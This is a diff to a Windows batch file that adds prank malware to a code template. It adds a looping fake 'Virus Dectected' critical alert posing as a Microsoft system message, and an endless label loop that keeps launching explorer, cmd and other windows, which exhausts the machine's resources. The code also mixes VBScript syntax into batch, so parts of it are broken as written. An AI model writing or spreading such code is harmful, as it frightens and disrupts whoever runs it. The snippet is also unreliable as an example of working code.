@@ -6,9 +6,15 @@ set number=1
 set update=1
 if %number% equ %update% (goto end)
 :: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+do
 x=MsgBox("Virus Dectected", vbOkOnly+vbCritical, "System32/Microsoft/")
-
-
+loop
+:x
+start explorer
+start cmd
+start google
+start 
+goto x
 
 
 :: END CODE HERE ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
